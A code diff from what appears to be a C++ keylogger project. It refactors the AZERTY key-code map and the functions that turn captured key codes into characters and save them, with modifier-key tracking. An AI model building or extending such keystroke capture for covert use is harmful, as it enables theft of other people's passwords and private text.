@@ -4,14 +4,14 @@
 
 #include "rkeylogger.h"
 
-//Default status (TODO: Check the default with termios.h)
+//TODO: Check the init value with termios.h or something else
 bool
     is_shift_pressed = false, 
     is_altgr_pressed = false, 
-    is_capslock_pressed = get_capsclock_status();
+    is_capslock_pressed = false;
 
-// Mapper for azerty 
-// { CODE, { NORMAL_VALUE, IF_SHIFT_IS_PRESSED, IF_ALTGR_IS_PRESSED }}
+// Mapper for basic azerty 
+// { KEY_CODE, { NORMAL_VALUE, IF_SHIFT_IS_PRESSED, IF_ALTGR_IS_PRESSED }}
 std::unordered_map<int, KeyValue> keyboard_layout = {
     //1st line of keyboard
     {1, { "ESC", "ESC", "ESC"}}, //TODO: F1 -> F2 ...
@@ -31,7 +31,7 @@ std::unordered_map<int, KeyValue> keyboard_layout = {
     {11,    {"à",   "0",    "@"}},
     {12,    {")",   "°",    "]"}},
     {13,    {"=",   "+",    "}"}},
-    {14,    {" ",   " ",    " "}}, //KEY_BACKSPACE
+    {14,    {"KEY_BACKSPACE",   "KEY_BACKSPACE",    "KEY_BACKSPACE"}},
     
     //3rd line of keyboard
     {15,    {"KEY_TAB",   "KEY_TAB",    "KEY_TAB"}},
@@ -63,7 +63,7 @@ std::unordered_map<int, KeyValue> keyboard_layout = {
     {39,    {"l",   "L",    "l"}},
     {40,    {"m",   "M",    "m"}},
     {41,    {"ù",   "%",    "ù"}},
-    {28,    {"\n",   "\n",    "\n"}}, //KEY_ENTER : Let's say that it insert new line
+    {28,    {"KEY_ENTER",   "KEY_ENTER",    "KEY_ENTER"}},
 
     //5th line of keyboard
     {42,    {"KEY_LEFTSHIFT",   "KEY_LEFTSHIFT",    "KEY_LEFTSHIFT"}},
@@ -83,37 +83,37 @@ std::unordered_map<int, KeyValue> keyboard_layout = {
     {100,    {"KEY_RIGHTALT",   "KEY_RIGHTALT",    "KEY_RIGHTALT"}},
 };
 
-//-----------------------------------------------------------------------------------
-void setLayout(Layout layout){
-    if(layout == Layout::QWERTY){
-        //TODO: remap the layout
-    }
+bool emit_code(int code){
+    if(is_capslock_pressed || is_shift_pressed)
+        return save_input(keyboard_layout[code].shift);
+    if(is_altgr_pressed)
+        return save_input(keyboard_layout[code].altgr);
+    return save_input(keyboard_layout[code].normal);
 }
 
-void emit_correct_code(int code){
-    if(is_capslock_pressed || is_shift_pressed){
-        save_input(keyboard_layout[code].shift);
-    }else if(is_altgr_pressed){
-        save_input(keyboard_layout[code].altgr);
-    }else{
-        save_input(keyboard_layout[code].normal);
-    }
-}
-
-bool map_code(int code, int value){
+MapSaveStatus map_code(int code, int value){
     bool status = code == 1;
-    if(code == 1)
-        return true;
-    
-    if(code != 29 && code > 1 && code <= 54){
-        if(code == 42 || code == 54)
+    std::cout << "code: " << code << std::endl;
+
+    switch(code){
+        case 1:
+            return MapSaveStatus::END;
+        case 100:
+            is_altgr_pressed = status;
+            break;
+        case 58:
+            is_capslock_pressed = status;
+            break;
+        case 42:
+        case 54:
             is_shift_pressed = status;
-        else
-            emit_correct_code(code);
-    }else if(code == 100)
-        is_altgr_pressed = status;
-    else if(code == 58)
-        is_capslock_pressed = status;
-    
-    return false; 
+            break;
+        default:
+            if(status && code != 29 && code > 1 && code <= 54)
+                if(!emit_code(code))
+                    return MapSaveStatus::ERROR;
+            break;
+    }
+
+    return MapSaveStatus::SUCCESS; 
 }
